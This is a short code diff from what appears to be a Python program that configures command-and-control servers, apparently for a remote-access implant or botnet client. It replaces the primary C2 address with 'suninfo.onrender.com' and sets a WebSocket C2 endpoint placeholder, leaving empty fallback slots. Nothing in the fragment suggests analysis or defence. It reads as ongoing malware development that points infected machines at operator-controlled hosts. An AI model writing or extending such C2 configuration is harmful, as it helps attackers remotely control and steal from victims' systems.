@@ -134,11 +134,11 @@ logging.basicConfig(
 
 # C2 Server Configuration
 C2_SERVERS = [
-    "https://v0-new-project-fhkrfg8taoh.vercel.app/",  # Primary server
+    "https://suninfo.onrender.com/",  # Primary server
     ""  # Fallback server (add more if needed)
 ]
 WS_SERVERS = [
-    "https://v0-new-project-fhkrfg8taoh.vercel.app/",  # Primary WebSocket server
+    "wss://your-c2-server.vercel.app/api/socket",  # Primary WebSocket server
     ""  # Fallback WebSocket server
 ]
 
